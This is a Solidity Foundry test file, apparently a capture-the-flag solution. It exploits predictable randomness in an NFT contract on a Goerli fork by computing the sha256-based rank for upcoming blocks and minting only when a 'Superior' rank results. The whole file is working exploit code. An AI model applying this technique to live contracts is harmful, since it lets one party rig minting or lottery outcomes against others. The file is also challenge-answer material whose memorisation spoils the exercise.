// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.19;

import "forge-std/Test.sol"; //needs to be replaced to run locally

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);

	function setUp() public {
		vm.createSelectFork("goerli"); //needs to be replaced to run locally
		vm.deal(hacker, 1 ether);
		nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
	}

	function test() public {
		vm.startPrank(hacker);
		uint mintedId;
		uint currentBlockNum = block.number;

		// Mint a Superior one, and do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);

			// ---- hacking time ----

            if((uint256(sha256(abi.encodePacked(uint256(0), hacker, currentBlockNum))) % 100) > 90 && mintedId == 0)
            {
				nft.call{value: 1 ether}(abi.encodeWithSignature("mint()"));
				mintedId = 1;
            }

			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}